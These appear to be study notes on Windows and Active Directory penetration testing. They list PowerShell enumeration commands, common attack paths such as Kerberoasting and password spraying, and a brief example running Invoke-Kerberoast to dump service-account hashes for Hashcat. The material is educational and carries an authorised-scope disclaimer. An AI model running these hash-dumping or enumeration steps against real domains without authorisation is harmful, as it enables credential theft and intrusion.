# Windows & Active Directory Notes

Another study-style page in the same vein as the Linux notes — demonstrates
a topic with heavier use of PowerShell code blocks.

## Local enumeration

```powershell
# Basic host info
systeminfo
whoami /all

# Installed patches
Get-HotFix | Sort-Object InstalledOn -Descending

# Local admin group membership
net localgroup administrators
```

## Domain enumeration

```powershell
# Current domain
Get-ADDomain

# Users and groups
Get-ADUser -Filter * -Properties MemberOf
Get-ADGroupMember -Identity "Domain Admins"

# Kerberoastable accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

## Common attack paths

- Kerberoasting service accounts with weak passwords
- AS-REP roasting accounts with pre-authentication disabled
- Unconstrained/constrained delegation abuse
- Password spraying against a exposed OWA/VPN portal
- GPO or ACL misconfigurations granting excessive rights

## Example: dumping a Kerberoastable hash

```prompt
PS C:\Users\bud> Get-ADUser -Filter {ServicePrincipalName -ne "$null"}
DistinguishedName : CN=svc-sql,CN=Users,DC=corp,DC=local
Name              : svc-sql
PS C:\Users\bud> Invoke-Kerberoast -OutputFormat Hashcat
```

> Demo content only — always work within an authorised scope and document
> findings as you go.
